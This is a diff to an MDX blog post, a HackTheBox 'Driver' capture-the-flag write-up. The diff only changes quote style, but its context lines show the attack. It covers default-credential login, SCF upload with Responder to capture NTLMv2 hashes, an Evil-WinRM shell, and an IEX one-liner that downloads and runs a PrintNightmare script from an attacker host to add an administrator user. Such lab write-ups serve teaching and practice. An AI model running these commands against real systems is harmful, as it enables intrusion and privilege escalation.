@@ -6,8 +6,8 @@ date: 2021-10-04
 image: hackthebox-driver-writeup.webp
 ---
 
-import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
-import { components as MDXComponents } from '../../components/mdxComponents';
+import FixTheImageURL from "../../components/mdxComponents/FixTheImageURL.astro";
+import { components as MDXComponents } from "../../components/mdxComponents";
 export const components = MDXComponents;
 
 ## Nmap
@@ -85,7 +85,7 @@ Bindings:
 
 We use `PrintNightmare` exploit against `Print System Remote Protocol` but for that we need user `creads` so let's move further.
 
-<FixTheImageURL src='cmd.png' slug='hackthebox-driver-writeup' />
+<FixTheImageURL src="cmd.png" slug="hackthebox-driver-writeup" />
 
 Same with the `smb` we need creads for `listing` the shares.
 
@@ -93,21 +93,21 @@ Same with the `smb` we need creads for `listing` the shares.
 
 When we go to the `ip` it's asking for `username` and `passsword`.
 
-<FixTheImageURL src='web.png' slug='hackthebox-driver-writeup' />
+<FixTheImageURL src="web.png" slug="hackthebox-driver-writeup" />
 
 I try `default` creads like `admin:admin` and it's `work`.
 
-<FixTheImageURL src='web1.png' slug='hackthebox-driver-writeup' />
+<FixTheImageURL src="web1.png" slug="hackthebox-driver-writeup" />
 
 We are inside `home` page.
 
-<FixTheImageURL src='web2.png' slug='hackthebox-driver-writeup' />
+<FixTheImageURL src="web2.png" slug="hackthebox-driver-writeup" />
 
 When i go inside `Firmware` Updates there is a option for `uploading` firmware and the name of the site is `MFP Firmware Update Center`.
 
 We can search any `exploit` for that `related` name.
 
-<FixTheImageURL src='web3.png' slug='hackthebox-driver-writeup' />
+<FixTheImageURL src="web3.png" slug="hackthebox-driver-writeup" />
 
 I can't find any `exploit` for that related name but we can `imagine` that when we `upload` the file the `server` saves the file inside `smb` share.
 
@@ -138,11 +138,11 @@ After that start the `responder` for capturing the `hashes`.
 
 Upload the `scf` file and click on `submit`.
 
-<FixTheImageURL src='web4.png' slug='hackthebox-driver-writeup' />
+<FixTheImageURL src="web4.png" slug="hackthebox-driver-writeup" />
 
 Now check your `responder` we got the hash `captured`
 
-<FixTheImageURL src='cmd1.png' slug='hackthebox-driver-writeup' />
+<FixTheImageURL src="cmd1.png" slug="hackthebox-driver-writeup" />
 
 ```js
 [SMB] NTLMv2 Client   : 10.10.11.106
@@ -184,7 +184,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:/Users/tony/Documents>
 ```
 
-<FixTheImageURL src='cmd2.png' slug='hackthebox-driver-writeup' />
+<FixTheImageURL src="cmd2.png" slug="hackthebox-driver-writeup" />
 
 ## Privilege escalation
 
@@ -247,7 +247,7 @@ Now let's `download` the file with `IEX` command.
 *Evil-WinRM* PS C:Users	onyDesktop > IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.116/CVE-2021-1675.ps1')
 ```
 
-<FixTheImageURL src='cmd3.png' slug='hackthebox-driver-writeup' />
+<FixTheImageURL src="cmd3.png" slug="hackthebox-driver-writeup" />
 
 Now it's imported `automatically` let's create new user with `Invoke-Nightmare` command.
 
@@ -262,4 +262,4 @@ now `connect` to the machine with new `username and passsword` and get `roo
 └──╼ [★]$ evil-winrm -i 10.10.11.106 -u dedsec -p dedsec@123
 ```
 
-<FixTheImageURL src='cmd4.png' slug='hackthebox-driver-writeup' />
+<FixTheImageURL src="cmd4.png" slug="hackthebox-driver-writeup" />
